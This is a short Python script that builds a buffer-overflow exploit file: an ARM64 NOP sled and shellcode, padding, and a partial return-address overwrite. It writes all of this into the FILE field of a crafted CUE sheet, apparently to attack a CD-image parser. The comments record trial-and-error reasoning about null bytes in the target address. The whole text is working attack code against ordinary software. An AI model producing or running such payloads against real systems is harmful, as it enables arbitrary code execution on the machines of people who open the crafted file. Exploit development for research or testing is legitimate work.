#!/usr/bin/env python3
import struct

nop = b"\x1f\x20\x03\xd5"
nop_sled = nop * 400  # 1600 bytes

shellcode = (
    b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2"
    b"\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa"
    b"\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2"
    b"\xe1\x66\x02\xd4"
)

payload = nop_sled + shellcode
payload = payload.ljust(2144, b"A")

# Write 6 bytes: \x48\xe3\xff\xff\xff\xff
# The next 2 bytes will become the upper part of the address
# We want the full address to be: 0x00??ffffffffe348
# The upper bytes should be small (0x0000) but we can't write nulls

# Strategy: Write bytes that when interpreted, give us a valid instruction
# OR: Make the upper bytes point somewhere useful

# Let's write the 6 bytes for our shellcode location
partial_addr = b"\x48\xe3\xff\xff\xff\xff"
payload += partial_addr

# Now write 2 bytes that will become the upper portion
# These can't be null, so let's try \x00\x00... wait, that won't work
# Let's try using values that make a valid address in a different region

# Actually, if the upper 2 bytes are from our padding, let's control them:
# Instead of 'B', let's use \x00\x00... but that's null bytes!

# NEW IDEA: Write 8 bytes total, but split them cleverly
# Write partial address + 2 printable bytes that could work

payload += b"\xff\xff"  # This makes address: 0xffffffffe348

# Pad the rest
payload += b"C" * (3000 - len(payload))

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

print(f"Payload created - full address will be: 0xffffffffe348")
